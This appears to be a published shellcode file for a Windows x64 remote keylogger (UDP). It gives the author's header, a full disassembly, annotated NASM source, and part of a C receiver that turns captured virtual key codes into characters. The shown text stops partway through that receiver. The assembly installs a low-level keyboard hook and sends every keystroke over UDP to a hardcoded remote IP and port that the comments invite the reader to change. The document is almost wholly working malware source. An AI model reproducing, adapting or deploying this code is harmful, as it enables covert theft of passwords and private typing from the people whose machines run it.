/*

	# Title : Windows x64 Remote Keylogger (UDP)
	# size : 864 bytes
	# Author : Roziul Hasan Khan Shifat
	# Tested On : Windows 10 x64 pro
	# Date : 26-10-2018
	# Email: shifath12@gmail.com

*/



/*


keyl.obj:     file format pe-x86-64


Disassembly of section .text:

0000000000000000 <_start>:
   0:	eb 1d                	jmp    1f <p1>

0000000000000002 <_init_>:
   2:	48 31 d2             	xor    rdx,rdx
   5:	65 48 8b 42 60       	mov    rax,QWORD PTR gs:[rdx+0x60]
   a:	48 8b 40 18          	mov    rax,QWORD PTR [rax+0x18]
   e:	48 8b 40 20          	mov    rax,QWORD PTR [rax+0x20]
  12:	48 8b 30             	mov    rsi,QWORD PTR [rax]
  15:	48 8b 06             	mov    rax,QWORD PTR [rsi]
  18:	48 8b 70 20          	mov    rsi,QWORD PTR [rax+0x20]
  1c:	5b                   	pop    rbx
  1d:	53                   	push   rbx
  1e:	c3                   	ret

000000000000001f <p1>:
  1f:	e8 de ff ff ff       	call   2 <_init_>

0000000000000024 <_p2_>:
  24:	52                   	push   rdx
  25:	52                   	push   rdx
  26:	4c 8d 3c 24          	lea    r15,[rsp]
  2a:	48 83 ec 38          	sub    rsp,0x38
  2e:	4c 8d 24 24          	lea    r12,[rsp]
  32:	48 83 ec 58          	sub    rsp,0x58
  36:	48 8d 3c 24          	lea    rdi,[rsp]
  3a:	41 57                	push   r15
  3c:	41 54                	push   r12
  3e:	57                   	push   rdi
  3f:	48 b8 48 45 52 45 49 	movabs rax,0x5349544945524548
  46:	54 49 53
  49:	50                   	push   rax
  4a:	48 31 c0             	xor    rax,rax
  4d:	66 b8 cc 01          	mov    ax,0x1cc
  51:	48 01 c3             	add    rbx,rax
  54:	53                   	push   rbx
  55:	48 89 f1             	mov    rcx,rsi
  58:	48 8d 93 6e ff ff ff 	lea    rdx,[rbx-0x92]
  5f:	4d 31 c0             	xor    r8,r8
  62:	41 b0 02             	mov    r8b,0x2
  65:	49 89 f9             	mov    r9,rdi
  68:	ff d3                	call   rbx
  6a:	41 5d                	pop    r13
  6c:	48 31 c0             	xor    rax,rax
  6f:	50                   	push   rax
  70:	50                   	push   rax
  71:	48 b8 77 73 32 5f 33 	movabs rax,0x642e32335f327377
  78:	32 2e 64
  7b:	48 89 04 24          	mov    QWORD PTR [rsp],rax
  7f:	66 c7 44 24 08 6c 6c 	mov    WORD PTR [rsp+0x8],0x6c6c
  86:	48 8d 0c 24          	lea    rcx,[rsp]
  8a:	48 8b 77 08          	mov    rsi,QWORD PTR [rdi+0x8]
  8e:	48 83 ec 28          	sub    rsp,0x28
  92:	ff d6                	call   rsi
  94:	48 96                	xchg   rsi,rax
  96:	48 8d 4c 24 28       	lea    rcx,[rsp+0x28]
  9b:	c7 01 75 73 65 72    	mov    DWORD PTR [rcx],0x72657375
  a1:	ff d0                	call   rax
  a3:	48 89 c1             	mov    rcx,rax
  a6:	49 8d 55 8c          	lea    rdx,[r13-0x74]
  aa:	4d 31 c0             	xor    r8,r8
  ad:	41 b0 06             	mov    r8b,0x6
  b0:	4c 8d 4f 10          	lea    r9,[rdi+0x10]
  b4:	41 ff d5             	call   r13
  b7:	48 89 f1             	mov    rcx,rsi
  ba:	49 8d 55 e7          	lea    rdx,[r13-0x19]
  be:	4d 31 c0             	xor    r8,r8
  c1:	41 b0 03             	mov    r8b,0x3
  c4:	4c 8d 4f 40          	lea    r9,[rdi+0x40]
  c8:	41 ff d5             	call   r13
  cb:	48 83 c4 38          	add    rsp,0x38

00000000000000cf <_p3_>:
  cf:	48 31 c9             	xor    rcx,rcx
  d2:	66 b9 98 01          	mov    cx,0x198
  d6:	48 29 cc             	sub    rsp,rcx
  d9:	48 83 c1 6a          	add    rcx,0x6a
  dd:	48 8d 14 24          	lea    rdx,[rsp]
  e1:	48 8b 5f 40          	mov    rbx,QWORD PTR [rdi+0x40]
  e5:	ff d3                	call   rbx
  e7:	48 31 c9             	xor    rcx,rcx
  ea:	b1 02                	mov    cl,0x2
  ec:	51                   	push   rcx
  ed:	51                   	push   rcx
  ee:	5a                   	pop    rdx
  ef:	41 58                	pop    r8
  f1:	41 b0 11             	mov    r8b,0x11
  f4:	48 8b 5f 48          	mov    rbx,QWORD PTR [rdi+0x48]
  f8:	ff d3                	call   rbx
  fa:	48 89 47 08          	mov    QWORD PTR [rdi+0x8],rax
  fe:	48 8b 1f             	mov    rbx,QWORD PTR [rdi]
 101:	48 31 c9             	xor    rcx,rcx
 104:	ff d3                	call   rbx
 106:	41 c6 07 02          	mov    BYTE PTR [r15],0x2
 10a:	66 41 c7 47 02 db 83 	mov    WORD PTR [r15+0x2],0x83db
 111:	41 c7 47 04 c1 a1 c1 	mov    DWORD PTR [r15+0x4],0x63c1a1c1
 118:	63
 119:	4d 31 c9             	xor    r9,r9
 11c:	41 51                	push   r9
 11e:	41 51                	push   r9
 120:	59                   	pop    rcx
 121:	5a                   	pop    rdx
 122:	b1 0d                	mov    cl,0xd
 124:	49 89 c0             	mov    r8,rax
 127:	b2 bc                	mov    dl,0xbc
 129:	4c 01 ea             	add    rdx,r13
 12c:	48 8b 5f 10          	mov    rbx,QWORD PTR [rdi+0x10]
 130:	ff d3                	call   rbx

0000000000000132 <_p4_>:
 132:	49 8d 4c 24 08       	lea    rcx,[r12+0x8]
 137:	48 31 d2             	xor    rdx,rdx
 13a:	52                   	push   rdx
 13b:	52                   	push   rdx
 13c:	41 58                	pop    r8
 13e:	41 59                	pop    r9
 140:	48 8b 5f 28          	mov    rbx,QWORD PTR [rdi+0x28]
 144:	ff d3                	call   rbx
 146:	49 8d 4c 24 08       	lea    rcx,[r12+0x8]
 14b:	48 8b 5f 30          	mov    rbx,QWORD PTR [rdi+0x30]
 14f:	ff d3                	call   rbx
 151:	49 8d 4c 24 08       	lea    rcx,[r12+0x8]
 156:	48 8b 5f 38          	mov    rbx,QWORD PTR [rdi+0x38]
 15a:	ff d3                	call   rbx
 15c:	eb d4                	jmp    132 <_p4_>

000000000000015e <kernel32_func>:
 15e:	47                   	rex.RXB
 15f:	65 74 4d             	gs je  1af <user32_func+0x33>
 162:	6f                   	outs   dx,DWORD PTR ds:[rsi]
 163:	64 75 6c             	fs jne 1d2 <user32_func+0x56>
 166:	65 48 61             	gs rex.W (bad)
 169:	6e                   	outs   dx,BYTE PTR ds:[rsi]
 16a:	64 6c                	fs ins BYTE PTR es:[rdi],dx
 16c:	65 41 01 4c 6f 61    	add    DWORD PTR gs:[r15+rbp*2+0x61],ecx
 172:	64 4c 69 62 72 61 72 	imul   r12,QWORD PTR fs:[rdx+0x72],0x41797261
 179:	79 41
 17b:	01 53 65             	add    DWORD PTR [rbx+0x65],edx

000000000000017c <user32_func>:
 17c:	53                   	push   rbx
 17d:	65 74 57             	gs je  1d7 <ws2_32_func>
 180:	69 6e 64 6f 77 73 48 	imul   ebp,DWORD PTR [rsi+0x64],0x4873776f
 187:	6f                   	outs   dx,DWORD PTR ds:[rsi]
 188:	6f                   	outs   dx,DWORD PTR ds:[rsi]
 189:	6b 45 78 41          	imul   eax,DWORD PTR [rbp+0x78],0x41
 18d:	01 43 61             	add    DWORD PTR [rbx+0x61],eax
 190:	6c                   	ins    BYTE PTR es:[rdi],dx
 191:	6c                   	ins    BYTE PTR es:[rdi],dx
 192:	4e                   	rex.WRX
 193:	65 78 74             	gs js  20a <get_addr+0x1a>
 196:	48 6f                	rex.W outs dx,DWORD PTR ds:[rsi]
 198:	6f                   	outs   dx,DWORD PTR ds:[rsi]
 199:	6b 45 78 01          	imul   eax,DWORD PTR [rbp+0x78],0x1
 19d:	47                   	rex.RXB
 19e:	65 74 4b             	gs je  1ec <ws2_32_func+0x15>
 1a1:	65 79 53             	gs jns 1f7 <get_addr+0x7>
 1a4:	74 61                	je     207 <get_addr+0x17>
 1a6:	74 65                	je     20d <get_addr+0x1d>
 1a8:	01 47 65             	add    DWORD PTR [rdi+0x65],eax
 1ab:	74 4d                	je     1fa <get_addr+0xa>
 1ad:	65 73 73             	gs jae 223 <get_addr+0x33>
 1b0:	61                   	(bad)
 1b1:	67 65 41 01 54 72 61 	add    DWORD PTR gs:[r10d+esi*2+0x61],edx
 1b8:	6e                   	outs   dx,BYTE PTR ds:[rsi]
 1b9:	73 6c                	jae    227 <get_addr+0x37>
 1bb:	61                   	(bad)
 1bc:	74 65                	je     223 <get_addr+0x33>
 1be:	4d                   	rex.WRB
 1bf:	65 73 73             	gs jae 235 <get_addr+0x45>
 1c2:	61                   	(bad)
 1c3:	67 65 01 44 69 73    	add    DWORD PTR gs:[ecx+ebp*2+0x73],eax
 1c9:	70 61                	jo     22c <get_addr+0x3c>
 1cb:	74 63                	je     230 <get_addr+0x40>
 1cd:	68 4d 65 73 73       	push   0x7373654d
 1d2:	61                   	(bad)
 1d3:	67 65 41 01 57 53    	add    DWORD PTR gs:[r15d+0x53],edx

00000000000001d7 <ws2_32_func>:
 1d7:	57                   	push   rdi
 1d8:	53                   	push   rbx
 1d9:	41 53                	push   r11
 1db:	74 61                	je     23e <get_addr+0x4e>
 1dd:	72 74                	jb     253 <get_addr+0x63>
 1df:	75 70                	jne    251 <get_addr+0x61>
 1e1:	01 73 6f             	add    DWORD PTR [rbx+0x6f],esi
 1e4:	63 6b 65             	movsxd ebp,DWORD PTR [rbx+0x65]
 1e7:	74 01                	je     1ea <ws2_32_func+0x13>
 1e9:	73 65                	jae    250 <get_addr+0x60>
 1eb:	6e                   	outs   dx,BYTE PTR ds:[rsi]
 1ec:	64 74 6f             	fs je  25e <get_addr+0x6e>
 1ef:	01 56 57             	add    DWORD PTR [rsi+0x57],edx

00000000000001f0 <get_addr>:
 1f0:	56                   	push   rsi
 1f1:	57                   	push   rdi
 1f2:	41 50                	push   r8
 1f4:	52                   	push   rdx
 1f5:	41 51                	push   r9
 1f7:	51                   	push   rcx
 1f8:	41 5b                	pop    r11
 1fa:	48 31 db             	xor    rbx,rbx
 1fd:	53                   	push   rbx
 1fe:	53                   	push   rbx
 1ff:	5a                   	pop    rdx
 200:	58                   	pop    rax
 201:	8b 59 3c             	mov    ebx,DWORD PTR [rcx+0x3c]
 204:	48 01 cb             	add    rbx,rcx
 207:	b2 88                	mov    dl,0x88
 209:	8b 04 13             	mov    eax,DWORD PTR [rbx+rdx*1]
 20c:	48 01 c8             	add    rax,rcx
 20f:	48 31 d2             	xor    rdx,rdx
 212:	52                   	push   rdx
 213:	52                   	push   rdx
 214:	52                   	push   rdx
 215:	41 58                	pop    r8
 217:	41 59                	pop    r9
 219:	41 5a                	pop    r10
 21b:	44 8b 40 20          	mov    r8d,DWORD PTR [rax+0x20]
 21f:	4d 01 d8             	add    r8,r11
 222:	44 8b 48 24          	mov    r9d,DWORD PTR [rax+0x24]
 226:	4d 01 d9             	add    r9,r11
 229:	44 8b 50 1c          	mov    r10d,DWORD PTR [rax+0x1c]
 22d:	4d 01 da             	add    r10,r11
 230:	48 31 d2             	xor    rdx,rdx
 233:	48 31 f6             	xor    rsi,rsi
 236:	56                   	push   rsi
 237:	59                   	pop    rcx
 238:	41 8b 34 90          	mov    esi,DWORD PTR [r8+rdx*4]
 23c:	4c 01 de             	add    rsi,r11
 23f:	48 8b 7c 24 08       	mov    rdi,QWORD PTR [rsp+0x8]
 244:	48 31 c0             	xor    rax,rax
 247:	8a 04 0f             	mov    al,BYTE PTR [rdi+rcx*1]
 24a:	48 ff c1             	inc    rcx
 24d:	3c 01                	cmp    al,0x1
 24f:	75 f6                	jne    247 <get_addr+0x57>
 251:	48 ff c2             	inc    rdx
 254:	51                   	push   rcx
 255:	48 ff c9             	dec    rcx
 258:	48 87 f7             	xchg   rdi,rsi
 25b:	f3 a6                	repz cmps BYTE PTR ds:[rsi],BYTE PTR es:[rdi]
 25d:	59                   	pop    rcx
 25e:	75 d3                	jne    233 <get_addr+0x43>
 260:	48 ff ca             	dec    rdx
 263:	48 8b 7c 24 08       	mov    rdi,QWORD PTR [rsp+0x8]
 268:	48 01 cf             	add    rdi,rcx
 26b:	48 89 7c 24 08       	mov    QWORD PTR [rsp+0x8],rdi
 270:	48 31 db             	xor    rbx,rbx
 273:	53                   	push   rbx
 274:	58                   	pop    rax
 275:	66 41 8b 1c 51       	mov    bx,WORD PTR [r9+rdx*2]
 27a:	41 8b 04 9a          	mov    eax,DWORD PTR [r10+rbx*4]
 27e:	4c 01 d8             	add    rax,r11
 281:	48 8b 1c 24          	mov    rbx,QWORD PTR [rsp]
 285:	48 89 03             	mov    QWORD PTR [rbx],rax
 288:	48 83 c3 08          	add    rbx,0x8
 28c:	48 89 1c 24          	mov    QWORD PTR [rsp],rbx
 290:	48 8b 5c 24 10       	mov    rbx,QWORD PTR [rsp+0x10]
 295:	48 ff cb             	dec    rbx
 298:	48 89 5c 24 10       	mov    QWORD PTR [rsp+0x10],rbx
 29d:	48 31 d2             	xor    rdx,rdx
 2a0:	48 39 d3             	cmp    rbx,rdx
 2a3:	75 8e                	jne    233 <get_addr+0x43>
 2a5:	48 83 c4 18          	add    rsp,0x18
 2a9:	5f                   	pop    rdi
 2aa:	5e                   	pop    rsi
 2ab:	c3                   	ret

00000000000002ac <_proceed_>:
 2ac:	48 83 ec 58          	sub    rsp,0x58
 2b0:	41 50                	push   r8
 2b2:	52                   	push   rdx
 2b3:	51                   	push   rcx
 2b4:	48 31 f6             	xor    rsi,rsi
 2b7:	48 b8 48 45 52 45 49 	movabs rax,0x5349544945524548
 2be:	54 49 53

00000000000002c1 <find>:
 2c1:	4c 8b 14 34          	mov    r10,QWORD PTR [rsp+rsi*1]
 2c5:	48 ff c6             	inc    rsi
 2c8:	49 39 c2             	cmp    r10,rax
 2cb:	75 f4                	jne    2c1 <find>
 2cd:	48 83 c6 07          	add    rsi,0x7
 2d1:	48 8d 1c 34          	lea    rbx,[rsp+rsi*1]
 2d5:	48 8b 3b             	mov    rdi,QWORD PTR [rbx]
 2d8:	4c 8b 63 08          	mov    r12,QWORD PTR [rbx+0x8]
 2dc:	4c 8b 7b 10          	mov    r15,QWORD PTR [rbx+0x10]
 2e0:	48 85 c9             	test   rcx,rcx
 2e3:	75 68                	jne    34d <_out_>
 2e5:	48 31 db             	xor    rbx,rbx
 2e8:	b3 01                	mov    bl,0x1
 2ea:	48 c1 e3 08          	shl    rbx,0x8
 2ee:	48 39 da             	cmp    rdx,rbx
 2f1:	75 5a                	jne    34d <_out_>
 2f3:	48 8b 5f 20          	mov    rbx,QWORD PTR [rdi+0x20]
 2f7:	48 31 c9             	xor    rcx,rcx
 2fa:	b1 14                	mov    cl,0x14
 2fc:	ff d3                	call   rbx
 2fe:	66 41 89 04 24       	mov    WORD PTR [r12],ax
 303:	48 8b 5f 20          	mov    rbx,QWORD PTR [rdi+0x20]
 307:	48 31 c9             	xor    rcx,rcx
 30a:	b1 10                	mov    cl,0x10
 30c:	ff d3                	call   rbx
 30e:	66 41 89 44 24 02    	mov    WORD PTR [r12+0x2],ax
 314:	48 8b 5c 24 10       	mov    rbx,QWORD PTR [rsp+0x10]
 319:	8b 03                	mov    eax,DWORD PTR [rbx]
 31b:	41 89 44 24 04       	mov    DWORD PTR [r12+0x4],eax
 320:	48 83 ec 58          	sub    rsp,0x58
 324:	48 8b 4f 08          	mov    rcx,QWORD PTR [rdi+0x8]
 328:	41 54                	push   r12
 32a:	5a                   	pop    rdx
 32b:	4d 31 c9             	xor    r9,r9
 32e:	41 51                	push   r9
 330:	41 58                	pop    r8
 332:	41 b0 10             	mov    r8b,0x10
 335:	4c 89 7c 24 20       	mov    QWORD PTR [rsp+0x20],r15
 33a:	4c 89 44 24 28       	mov    QWORD PTR [rsp+0x28],r8
 33f:	49 83 e8 08          	sub    r8,0x8
 343:	48 8b 5f 50          	mov    rbx,QWORD PTR [rdi+0x50]
 347:	ff d3                	call   rbx
 349:	48 83 c4 58          	add    rsp,0x58

000000000000034d <_out_>:
 34d:	5a                   	pop    rdx
 34e:	41 58                	pop    r8
 350:	41 59                	pop    r9
 352:	48 8b 5f 18          	mov    rbx,QWORD PTR [rdi+0x18]
 356:	48 31 c9             	xor    rcx,rcx
 359:	ff d3                	call   rbx
 35b:	48 83 c4 58          	add    rsp,0x58
 35f:	c3                   	ret







*/




/*
section .text
	global _start
_start:

jmp short p1

_init_:

xor rdx,rdx
mov rax,[gs:rdx+0x60] ; getting pointer of PEB structure
mov rax,[rax+24] ;rax=PPEB->Ldr
mov rax,[rax+32] ;Ldr->InMemoryOrderModuleList
mov rsi,[rax]
mov rax,[rsi]
mov rsi,[rax+32] ;kernel32.dll base address

pop rbx ;address of _p2_

push rbx
ret; transferring execution control to _p2_



p1:
call _init_



;-----------------------------------------------------------------------------------------------------

_p2_:


push rdx
push rdx
lea r15,[rsp]
sub rsp,56
lea r12,[rsp] ; pointer important data (2 short int + 1 DWORD + 48 byte MSG structure )
sub rsp,88
lea rdi,[rsp] ; pointer to function address



push r15
push r12
push rdi
mov rax,'HEREITIS'
push rax

xor rax,rax
mov ax,get_addr-_p2_
add rbx,rax ; address of get_addr

push rbx ;reserving future use

mov rcx,rsi


lea rdx,[rbx-(get_addr-kernel32_func)]


xor r8,r8
mov r8b,2
mov r9,rdi
call rbx ;loading kernel32_func functions


;-------------------------------------------------------------------------------------

pop r13 ;address of get_addr

;loading ws2_32.dll

xor rax,rax
push rax
push rax

mov rax,'ws2_32.d'
mov [rsp],rax
mov [rsp+8],word 'll'
lea rcx,[rsp]
mov rsi,[rdi+8]
sub rsp,40

call rsi
xchg rsi,rax

;----------------------------------------------------------
;loading user32.dll
lea rcx,[rsp+40]
mov [rcx],dword 'user'

call rax


;====================================
;loading user32.dll functions
mov rcx,rax
lea rdx,[r13-(get_addr-user32_func)]
xor r8,r8
mov r8b,6
lea r9,[rdi+16] ;user32.dll functions from 16
call r13

;===================================
;loading ws2_32.dll functions

mov rcx,rsi
lea rdx,[r13-(get_addr-ws2_32_func)]
xor r8,r8
mov r8b,3
lea r9,[rdi+64] ;ws2_32.dll functions from 64
call r13

add rsp,56
;===========================================All necessary functions are loaded. Time to proceed to main task ========================================

_p3_:

xor rcx,rcx
mov cx,408
sub rsp,rcx
add rcx,106
lea rdx,[rsp]
mov rbx,[rdi+64] ;WSAStartup()

call rbx


xor rcx,rcx




mov cl,2
push rcx
push rcx
pop rdx
pop r8
mov r8b,17
mov rbx,[rdi+72] ;socket()
call rbx

mov [rdi+8],rax ;SOCKET





mov rbx,[rdi] ; GetModuleHandleA()
xor rcx,rcx
call rbx

;------------------------------------

mov [r15],byte 2
mov [r15+2],word 0x83db ;port change it
mov [r15+4],dword 0x63c1a1c1 ;IP change it

;-----------------------------------




xor r9,r9
push r9
push r9
pop rcx
pop rdx
mov cl,13
mov r8,rax
mov dl,_proceed_-get_addr
add rdx,r13
mov rbx,[rdi+16] ;SetWindowsHookExA()

call rbx



_p4_:

lea rcx,[r12+8]
xor rdx,rdx
push rdx
push rdx
pop r8
pop r9
mov rbx,[rdi+40] ;GetMessageA()



call rbx




lea rcx,[r12+8]
mov rbx,[rdi+48] ;TranslateMessage()

call rbx

lea rcx,[r12+8]
mov rbx,[rdi+56] ;DispatchMessageA()

call rbx


jmp short _p4_



;----------------------------------------------------------------------------------------
kernel32_func:
db 'GetModuleHandleA',1,'LoadLibraryA',1


user32_func:
db 'SetWindowsHookExA',1,'CallNextHookEx',1,'GetKeyState',1,'GetMessageA',1,'TranslateMessage',1,'DispatchMessageA',1

ws2_32_func:
db 'WSAStartup',1,'socket',1,'sendto',1


get_addr: ; rcx=dll base , rdx=function name string address , r8=number of functions , r9=address of buffer
db 0x56,0x57,0x41,0x50,0x52,0x41,0x51,0x51,0x41,0x5b,0x48,0x31,0xdb,0x53,0x53,0x5a,0x58,0x8b,0x59,0x3c,0x48,0x01,0xcb,0xb2,0x88,0x8b,0x04,0x13,0x48,0x01,0xc8,0x48,0x31,0xd2,0x52,0x52,0x52,0x41,0x58,0x41,0x59,0x41,0x5a,0x44,0x8b,0x40,0x20,0x4d,0x01,0xd8,0x44,0x8b,0x48,0x24,0x4d,0x01,0xd9,0x44,0x8b,0x50,0x1c,0x4d,0x01,0xda,0x48,0x31,0xd2,0x48,0x31,0xf6,0x56,0x59,0x41,0x8b,0x34,0x90,0x4c,0x01,0xde,0x48,0x8b,0x7c,0x24,0x08,0x48,0x31,0xc0,0x8a,0x04,0x0f,0x48,0xff,0xc1,0x3c,0x01,0x75,0xf6,0x48,0xff,0xc2,0x51,0x48,0xff,0xc9,0x48,0x87,0xf7,0xf3,0xa6,0x59,0x75,0xd3,0x48,0xff,0xca,0x48,0x8b,0x7c,0x24,0x08,0x48,0x01,0xcf,0x48,0x89,0x7c,0x24,0x08,0x48,0x31,0xdb,0x53,0x58,0x66,0x41,0x8b,0x1c,0x51,0x41,0x8b,0x04,0x9a,0x4c,0x01,0xd8,0x48,0x8b,0x1c,0x24,0x48,0x89,0x03,0x48,0x83,0xc3,0x08,0x48,0x89,0x1c,0x24,0x48,0x8b,0x5c,0x24,0x10,0x48,0xff,0xcb,0x48,0x89,0x5c,0x24,0x10,0x48,0x31,0xd2,0x48,0x39,0xd3,0x75,0x8e,0x48,0x83,0xc4,0x18,0x5f,0x5e,0xc3

;-------------------------------------------------------------------------------------------------------------------
_proceed_:

sub rsp,88
push r8
push rdx
push rcx




;---------------------------------------------
xor rsi,rsi
mov rax,'HEREITIS'
find:


mov r10,[rsp+rsi]
inc rsi
cmp r10,rax
jne find

add rsi,7
lea rbx,[rsp+rsi]
mov rdi,[rbx]
mov r12,[rbx+8]
mov r15,[rbx+16]


;------------------------------------------------
test rcx,rcx
jnz short _out_

xor rbx,rbx
mov bl,1
shl rbx,8

cmp rdx,rbx
jne short _out_


;--------------------------------------------------------

mov rbx,[rdi+32] ;GetKeyState(VK_CAPITAL)
xor rcx,rcx
mov cl,0x14
call rbx

mov [r12],ax

mov rbx,[rdi+32] ;GetKeyState(VK_SHIFT)
xor rcx,rcx
mov cl,0x10
call rbx

mov [r12+2],ax




;-------------------------------
;sending keystrokes
mov rbx,[rsp+16]
mov eax,[rbx]
mov [r12+4],eax ;Virtual key code

sub rsp,88
mov rcx,[rdi+8] ;SOCKET
push r12
pop rdx

xor r9,r9
push r9

pop r8
mov r8b,16
mov [rsp+32],r15
mov [rsp+40],r8
sub r8,8

mov rbx,[rdi+80]
call rbx
add rsp,88


;-----------------------------------------------------------

_out_:

pop rdx
pop r8
pop r9


mov rbx,[rdi+24]

xor rcx,rcx

call rbx


add rsp,88


ret






*/


/*

//keylogger Handler

#include<stdio.h>
#include<winsock2.h>
#include<windows.h>

#pragma pack(1)

typedef struct key
{
	short caps;
	short shift;
	DWORD vkcode;
}KEYDATA;


char * Determine(BOOL caps,BOOL shift,DWORD code)
{
	char * key;
		switch (code) // SWITCH ON INT
			{
				case 0x41: key = caps ? (shift ? "a" : "A") : (shift ? "A" : "a"); break;
				case 0x42: key = caps ? (shift ? "b" : "B") : (shift ? "B" : "b"); break;
				case 0x43: key = caps ? (shift ? "c" : "C") : (shift ? "C" : "c"); break;
				case 0x44: key = caps ? (shift ? "d" : "D") : (shift ? "D" : "d"); break;
				case 0x45: key = caps ? (shift ? "e" : "E") : (shift ? "E" : "e"); break;
				case 0x46: key = caps ? (shift ? "f" : "F") : (shift ? "F" : "f"); break;
				case 0x47: key = caps ? (shift ? "g" : "G") : (shift ? "G" : "g"); break;
				case 0x48: key = caps ? (shift ? "h" : "H") : (shift ? "H" : "h"); break;
				case 0x49: key = caps ? (shift ? "i" : "I") : (shift ? "I" : "i"); break;
				case 0x4A: key = caps ? (shift ? "j" : "J") : (shift ? "J" : "j"); break;
				case 0x4B: key = caps ? (shift ? "k" : "K") : (shift ? "K" : "k"); break;
				case 0x4C: key = caps ? (shift ? "l" : "L") : (shift ? "L" : "l"); break;
				case 0x4D: key = caps ? (shift ? "m" : "M") : (shift ? "M" : "m"); break;
				case 0x4E: key = caps ? (shift ? "n" : "N") : (shift ? "N" : "n"); break;
				case 0x4F: key = caps ? (shift ? "o" : "O") : (shift ? "O" : "o"); break;
				case 0x50: key = caps ? (shift ? "p" : "P") : (shift ? "P" : "p"); break;
				case 0x51: key = caps ? (shift ? "q" : "Q") : (shift ? "Q" : "q"); break;
				case 0x52: key = caps ? (shift ? "r" : "R") : (shift ? "R" : "r"); break;
				case 0x53: key = caps ? (shift ? "s" : "S") : (shift ? "S" : "s"); break;
				case 0x54: key = caps ? (shift ? "t" : "T") : (shift ? "T" : "t"); break;
				case 0x55: key = caps ? (shift ? "u" : "U") : (shift ? "U" : "u"); break;
				case 0x56: key = caps ? (shift ? "v" : "V") : (shift ? "V" : "v"); break;
				case 0x57: key = caps ? (shift ? "w" : "W") : (shift ? "W" : "w"); break;
				case 0x58: key = caps ? (shift ? "x" : "X") : (shift ? "X" : "x"); break;
				case 0x59: key = caps ? (shift ? "y" : "Y") : (shift ? "Y" : "y"); break;
				case 0x5A: key = caps ? (shift ? "z" : "Z") : (shift ? "Z" : "z"); break;
				// Sleep Key
				case VK_SLEEP: key = "[SLEEP]"; break;
				// Num Keyboard
				case VK_NUMPAD0:  key = "0"; break;
				case VK_NUMPAD1:  key = "1"; break;
				case VK_NUMPAD2 : key = "2"; break;
				case VK_NUMPAD3:  key = "3"; break;
				case VK_NUMPAD4:  key = "4"; break;
				case VK_NUMPAD5:  key = "5"; break;
				case VK_NUMPAD6:  key = "6"; break;
				case VK_NUMPAD7:  key = "7"; break;
				case VK_NUMPAD8:  key = "8"; break;
				case VK_NUMPAD9:  key = "9"; break;
				case VK_MULTIPLY: key = "*"; break;
				case VK_ADD:      key = "+"; break;
				case VK_SEPARATOR: key = "-"; break;
				case VK_SUBTRACT: key = "-"; break;
				case VK_DECIMAL:  key = "."; break;
				case VK_DIVIDE:   key = "/"; break;
				// Function Keys
				case VK_F1:  key = "[F1]"; break;
				case VK_F2:  key = "[F2]"; break;
				case VK_F3:  key = "[F3]"; break;
				case VK_F4:  key = "[F4]"; break;
				case VK_F5:  key = "[F5]"; break;
				case VK_F6:  key = "[F6]"; break;
				case VK_F7:  key = "[F7]"; break;
				case VK_F8:  key = "[F8]"; break;
				case VK_F9:  key = "[F9]"; break;
				case VK_F10:  key = "[F10]"; break;
				case VK_F11:  key = "[F11]"; break;
				case VK_F12:  key = "[F12]"; break;
				case VK_F13:  key = "[F13]"; break;
				case VK_F14:  key = "[F14]"; break;
				case VK_F15:  key = "[F15]"; break;
				case VK_F16:  key = "[F16]"; break;
				case VK_F17:  key = "[F17]"; break;
				case VK_F18:  key = "[F18]"; break;
				case VK_F19:  key = "[F19]"; break;
				case VK_F20:  key = "[F20]"; break;
				case VK_F21:  key = "[F22]"; break;
				case VK_F22:  key = "[F23]"; break;
				case VK_F23:  key = "[F24]"; break;
				case VK_F24:  key = "[F25]"; break;
				// Keys
				case VK_NUMLOCK: key = "[NUM-LOCK]"; break;
				case VK_SCROLL:  key = "[SCROLL-LOCK]"; break;
				case VK_BACK:    key = "[BACK]"; break;
				case VK_TAB:     key = "[TAB]"; break;
				case VK_CLEAR:   key = "[CLEAR]"; break;
				case VK_RETURN:  key = "[ENTER]"; break;
				case VK_SHIFT:   key = "[SHIFT]"; break;
				case VK_CONTROL: key = "[CTRL]"; break;
				case VK_MENU:    key = "[ALT]"; break;
				case VK_PAUSE:   key = "[PAUSE]"; break;
				case VK_CAPITAL: key = "[CAP-LOCK]"; break;
				case VK_ESCAPE:  key = "[ESC]"; break;
				case VK_SPACE:   key = "[SPACE]"; break;
				case VK_PRIOR:   key = "[PAGEUP]"; break;
				case VK_NEXT:    key = "[PAGEDOWN]"; break;
				case VK_END:     key = "[END]"; break;
				case VK_HOME:    key = "[HOME]"; break;
				case VK_LEFT:    key = "[LEFT]"; break;
				case VK_UP:      key = "[UP]"; break;
				case VK_RIGHT:   key = "[RIGHT]"; break;
				case VK_DOWN:    key = "[DOWN]"; break;
				case VK_SELECT:  key = "[SELECT]"; break;
				case VK_PRINT:   key = "[PRINT]"; break;
				case VK_SNAPSHOT: key = "[PRTSCRN]"; break;
				case VK_INSERT:  key = "[INS]"; break;
				case VK_DELETE:  key = "[DEL]"; break;
				case VK_HELP:    key = "[HELP]"; break;
				// Number Keys with shift
				case 0x30:  key = shift ? ")" : "0"; break;
				case 0x31:  key = shift ? "!" : "1"; break;
				case 0x32:  key = shift ? "@" : "2"; break;
				case 0x33:  key = shift ? "#" : "3"; break;
				case 0x34:  key = shift ? "$" : "4"; break;
				case 0x35:  key = shift ? "%" : "5"; break;
				case 0x36:  key = shift ? "^" : "6"; break;
				case 0x37:  key = shift ? "&" : "7"; break;
				case 0x38:  key = shift ? "*" : "8"; break;
				case 0x39:  key = shift ? "(" : "9"; break;
				// Windows Keys
				case VK_LWIN:     key = "[WIN]"; break;
				case VK_RWIN:     key = "[WIN]"; break;
				case VK_LSHIFT:   key = "[SHIFT]"; break;
				case VK_RSHIFT:   key = "[SHIFT]"; break;
				case VK_LCONTROL: key = "[CTRL]"; break;
				case VK_RCONTROL: key = "[CTRL]"; break;
				// OEM Keys with shift
				case VK_OEM_1:      key = shift ? ":" : ";"; break;
				case VK_OEM_PLUS:   key = shift ? "+" : "="; break;
				case VK_OEM_COMMA:  key = shift ? "<" : ","; break;
				case VK_OEM_MINUS:  key = shift ? "_" : "-"; break;
				case VK_OEM_PERIOD: key = shift ? ">" : "."; break;
				case VK_OEM_2:      key = shift ? "?" : "/"; break;
				case VK_OEM_3:      key = shift ? "~" : "`"; break;
				case VK_OEM_4:      key = shift ? "{" : "["; break;
				case VK_OEM_5:      key = shift ? "|" : "\\"; break;
				case VK_OEM_6:      key = shift ? "}" : "]"; break;
				case VK_OEM_7:      key = shift ? "\"" : "'"; break; //TODO: Escape this char: "
				// Action Keys
